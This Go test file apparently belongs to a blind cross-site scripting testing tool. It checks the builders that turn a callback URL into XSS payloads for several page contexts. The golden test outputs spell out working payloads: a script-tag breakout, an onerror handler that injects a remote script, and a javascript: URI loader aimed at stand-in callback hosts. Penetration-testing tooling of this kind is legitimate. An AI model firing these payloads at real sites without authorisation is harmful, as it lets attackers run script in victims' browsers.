package payloads

import (
	"html"
	"net/url"
	"strconv"
	"strings"
	"testing"

	"github.com/ethicalhackingplayground/bxss/v2/pkg/arguments"
)

const (
	jsPrefix        = "'</script><script src='"
	jsSuffix        = "'></script>"
	attributePrefix = "'\" onerror='"
	attributeSuffix = "'>"
	uriPrefix       = "javascript:"
)

// specialCallbacks covers ports, multi-parameter query strings with '&',
// quotes, backslashes, angle brackets, double quotes and the trace
// placeholder.
var specialCallbacks = []string{
	"https://cb.example:8443/c?a=1&b=2",
	"http://host.example:8080/path?z=9&a=1&m=two",
	"https://cb.example/x?q=it's",
	"https://cb.example/x?p=a\\b",
	"https://cb.example/x?h=<x>&y=1",
	"https://cb.example/x?d=a\"b",
	"https://cb.example/c?url={LINK}",
}

func TestBuildHTMLIsByteForByteIdentity(t *testing.T) {
	legacy := []string{
		// The exact payload documented in the project README.
		"'\" ><script src=https://xss.report/c/username></script>",
		"'><script src=https://xss.report/c/username?url={LINK}></script>",
		"javascript:alert(1)",
		"",
	}
	legacy = append(legacy, specialCallbacks...)

	for _, raw := range legacy {
		t.Run(raw, func(t *testing.T) {
			got, err := Build(raw, arguments.ContextHTML)
			if err != nil {
				t.Fatalf("html context returned unexpected error: %v", err)
			}
			if got != raw {
				t.Fatalf("html context must be byte-for-byte identical:\n want %q\n got  %q", raw, got)
			}

			// The zero value / omitted flag must behave like html.
			gotEmpty, err := Build(raw, "")
			if err != nil || gotEmpty != raw {
				t.Fatalf("empty context must match html context: got %q, err %v", gotEmpty, err)
			}
		})
	}
}

func TestBuildContextsRoundTripAndStructure(t *testing.T) {
	contexts := []arguments.Context{
		arguments.ContextJS,
		arguments.ContextAttribute,
		arguments.ContextURI,
	}

	for _, callback := range specialCallbacks {
		for _, ctx := range contexts {
			t.Run(string(ctx)+"/"+callback, func(t *testing.T) {
				out, err := Build(callback, ctx)
				if err != nil {
					t.Fatalf("Build(%q, %s) error: %v", callback, ctx, err)
				}

				switch ctx {
				case arguments.ContextJS:
					assertJSStructure(t, out)
				case arguments.ContextAttribute:
					assertAttributeStructure(t, out)
				case arguments.ContextURI:
					assertURIStructure(t, out)
				}

				recovered := roundTrip(t, out, ctx)
				if recovered != callback {
					t.Fatalf("callback round trip mismatch:\n want %q\n got  %q", callback, recovered)
				}
				assertURLComponents(t, callback, recovered)
			})
		}
	}
}

func TestBuildGoldenOutputs(t *testing.T) {
	callback := "https://cb.example:8443/c?a=1&b=2"

	tests := []struct {
		name    string
		context arguments.Context
		want    string
	}{
		{
			name:    "js",
			context: arguments.ContextJS,
			want:    "'</script><script src='https://cb.example:8443/c?a=1&amp;b=2'></script>",
		},
		{
			name:    "attribute",
			context: arguments.ContextAttribute,
			want:    "'\" onerror='var s=document.createElement(&#39;script&#39;);s.src=&#39;https://cb.example:8443/c?a=1&amp;b=2&#39;;document.body.appendChild(s)'>",
		},
		{
			name:    "uri",
			context: arguments.ContextURI,
			want:    "javascript:var%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%22https%3A%2F%2Fcb.example%3A8443%2Fc%3Fa%3D1%26b%3D2%22%3Bdocument.body.appendChild%28s%29",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := Build(callback, tt.context)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Fatalf("golden payload mismatch:\n want %q\n got  %q", tt.want, got)
			}
		})
	}
}

func TestBuildRejectsMisusedCallbacks(t *testing.T) {
	invalid := []string{
		"javascript:alert(1)",
		"javascript:document.location='https://cb.example/x'",
		"data:text/html,<script>alert(1)</script>",
		"/relative/path?a=1",
		"https://",
		"",
		"   ",
	}

	for _, raw := range invalid {
		for _, ctx := range []arguments.Context{
			arguments.ContextJS,
			arguments.ContextAttribute,
			arguments.ContextURI,
		} {
			t.Run(string(ctx)+"/"+raw, func(t *testing.T) {
				if _, err := Build(raw, ctx); err == nil {
					t.Fatalf("Build(%q, %s) expected error, got nil", raw, ctx)
				}
			})
		}
	}

	// html never parses, so even non-HTTP input survives untouched rather
	// than erroring: legacy behaviour must not gain new validation errors.
	got, err := Build("javascript:alert(1)", arguments.ContextHTML)
	if err != nil || got != "javascript:alert(1)" {
		t.Fatalf("html context must stay permissive, got %q, err %v", got, err)
	}
}

func TestBuildUnknownContext(t *testing.T) {
	if _, err := Build("https://cb.example/x", arguments.Context("css")); err == nil {
		t.Fatal("expected error for unsupported context")
	}
}

func TestBuildAllPreservesOrderAndPropagatesErrors(t *testing.T) {
	inputs := []string{
		"https://cb.example:8443/c?a=1&b=2",
		"http://host.example:8080/p?z=9&a=1",
	}

	// html is identity: order and bytes preserved.
	got, err := BuildAll(inputs, arguments.ContextHTML)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != len(inputs) {
		t.Fatalf("length mismatch: want %d, got %d", len(inputs), len(got))
	}
	for i := range inputs {
		if got[i] != inputs[i] {
			t.Fatalf("index %d mismatch: want %q, got %q", i, inputs[i], got[i])
		}
	}

	if _, err := BuildAll([]string{"https://cb.example/x", "javascript:alert(1)"}, arguments.ContextURI); err == nil {
		t.Fatal("expected BuildAll to propagate the invalid callback error")
	}
}

func TestTracePlaceholderSurvives(t *testing.T) {
	callback := "https://cb.example/c?url={LINK}"
	for _, ctx := range []arguments.Context{
		arguments.ContextJS,
		arguments.ContextAttribute,
		arguments.ContextURI,
	} {
		out, err := Build(callback, ctx)
		if err != nil {
			t.Fatalf("unexpected error for %s: %v", ctx, err)
		}
		if !strings.Contains(out, linkPlaceholder) {
			t.Fatalf("%s payload lost the %s placeholder: %q", ctx, linkPlaceholder, out)
		}
	}
}

// --- structural assertions -------------------------------------------------

func assertJSStructure(t *testing.T, payload string) {
	t.Helper()
	if !strings.HasPrefix(payload, jsPrefix) || !strings.HasSuffix(payload, jsSuffix) {
		t.Fatalf("js payload missing breakout wrappers: %q", payload)
	}
	// One injected opening tag and two closing tags: the first closes the
	// page's existing <script>, the second closes the injected one.
	if strings.Count(payload, "<script ") != 1 || strings.Count(payload, "</script>") != 2 {
		t.Fatalf("js payload has unbalanced script tags: %q", payload)
	}
	mid := payload[len(jsPrefix) : len(payload)-len(jsSuffix)]
	// The encoded src value is HTML entity-encoded, so strip the known
	// entities first; any remaining raw delimiter could re-open the
	// attribute or inject a stray tag.
	if residual := stripHTMLEntities(mid); strings.ContainsAny(residual, "'\"<>&") {
		t.Fatalf("js src value contains raw delimiters: %q", mid)
	}
}

func assertAttributeStructure(t *testing.T, payload string) {
	t.Helper()
	if !strings.HasPrefix(payload, attributePrefix) || !strings.HasSuffix(payload, attributeSuffix) {
		t.Fatalf("attribute payload missing breakout wrappers: %q", payload)
	}
	handler := payload[len(attributePrefix) : len(payload)-len(attributeSuffix)]
	// Everything inside the onerror attribute value is entity-encoded.
	if residual := stripHTMLEntities(handler); strings.ContainsAny(residual, "'\"<>&") {
		t.Fatalf("attribute handler contains raw delimiters: %q", handler)
	}
}

func assertURIStructure(t *testing.T, payload string) {
	t.Helper()
	if !strings.HasPrefix(payload, uriPrefix) {
		t.Fatalf("uri payload must start with javascript: got %q", payload)
	}
	body := strings.TrimPrefix(payload, uriPrefix)
	if strings.ContainsAny(body, "'\"<>& ") {
		t.Fatalf("javascript: body contains raw metacharacters: %q", body)
	}
	if _, err := url.PathUnescape(body); err != nil {
		t.Fatalf("javascript: body is not percent-decodable: %v", err)
	}
}

// --- round-trip helpers ----------------------------------------------------

// stripHTMLEntities removes the exact entities emitted by html.EscapeString
// so structural assertions can check for un-encoded raw delimiters.
func stripHTMLEntities(value string) string {
	for _, entity := range []string{"&amp;", "&lt;", "&gt;", "&#39;", "&#34;", "&quot;", "&apos;"} {
		value = strings.ReplaceAll(value, entity, "")
	}
	return value
}

func roundTrip(t *testing.T, payload string, ctx arguments.Context) string {
	t.Helper()
	switch ctx {
	case arguments.ContextJS:
		mid := payload[len(jsPrefix) : len(payload)-len(jsSuffix)]
		return jsUnescapeSingle(html.UnescapeString(mid))
	case arguments.ContextAttribute:
		handler := html.UnescapeString(payload[len(attributePrefix) : len(payload)-len(attributeSuffix)])
		start := strings.Index(handler, "s.src='")
		if start < 0 {
			t.Fatalf("attribute handler missing s.src assignment: %q", handler)
		}
		start += len("s.src='")
		end := strings.Index(handler[start:], "';document.body.appendChild(s)")
		if end < 0 {
			t.Fatalf("attribute handler missing closing marker: %q", handler)
		}
		return jsUnescapeSingle(handler[start : start+end])
	case arguments.ContextURI:
		body, err := url.PathUnescape(strings.TrimPrefix(payload, uriPrefix))
		if err != nil {
			t.Fatalf("uri body decode error: %v", err)
		}
		start := strings.Index(body, `s.src="`)
		if start < 0 {
			t.Fatalf("uri body missing s.src assignment: %q", body)
		}
		start += len(`s.src="`)
		end := strings.Index(body[start:], `";document.body.appendChild(s)`)
		if end < 0 {
			t.Fatalf("uri body missing closing marker: %q", body)
		}
		return jsUnescapeDouble(body[start : start+end])
	default:
		t.Fatalf("unsupported context in round trip: %s", ctx)
		return ""
	}
}

func assertURLComponents(t *testing.T, original, recovered string) {
	t.Helper()
	want, err := url.Parse(original)
	if err != nil {
		t.Fatalf("invalid original callback: %v", err)
	}
	got, err := url.Parse(recovered)
	if err != nil {
		t.Fatalf("recovered callback does not parse: %v", err)
	}
	if got.Scheme != want.Scheme {
		t.Errorf("scheme changed: want %q, got %q", want.Scheme, got.Scheme)
	}
	if got.Hostname() != want.Hostname() {
		t.Errorf("host changed: want %q, got %q", want.Hostname(), got.Hostname())
	}
	if got.Port() != want.Port() {
		t.Errorf("port changed: want %q, got %q", want.Port(), got.Port())
	}
	if got.RawQuery != want.RawQuery {
		t.Errorf("raw query changed: want %q, got %q", want.RawQuery, got.RawQuery)
	}
	// Query parameter order is part of the round-trip contract.
	wantOrder := strings.Split(want.RawQuery, "&")
	gotOrder := strings.Split(got.RawQuery, "&")
	if len(wantOrder) != len(gotOrder) {
		t.Fatalf("query parameter count changed: want %v, got %v", wantOrder, gotOrder)
	}
	for i := range wantOrder {
		if wantOrder[i] != gotOrder[i] {
			t.Errorf("query order changed at %d: want %q, got %q", i, wantOrder[i], gotOrder[i])
		}
	}
}

func jsUnescapeSingle(value string) string {
	return jsUnescape(value, '\'')
}

func jsUnescapeDouble(value string) string {
	return jsUnescape(value, '"')
}

// jsUnescape reverses the single- and double-quoted JS string escaping used
// by the builders, enough to verify round trips in tests.
func jsUnescape(value string, quote byte) string {
	var builder strings.Builder
	for i := 0; i < len(value); {
		if value[i] != '\\' || i+1 >= len(value) {
			builder.WriteByte(value[i])
			i++
			continue
		}
		switch value[i+1] {
		case '\\':
			builder.WriteByte('\\')
			i += 2
		case quote:
			builder.WriteByte(quote)
			i += 2
		case 'n':
			builder.WriteByte('\n')
			i += 2
		case 'r':
			builder.WriteByte('\r')
			i += 2
		case 'u':
			if i+6 > len(value) {
				builder.WriteByte(value[i])
				i++
				continue
			}
			code, err := strconv.ParseUint(value[i+2:i+6], 16, 32)
			if err != nil {
				builder.WriteByte(value[i])
				i++
				continue
			}
			builder.WriteRune(rune(code))
			i += 6
		default:
			builder.WriteByte(value[i+1])
			i += 2
		}
	}
	return builder.String()
}
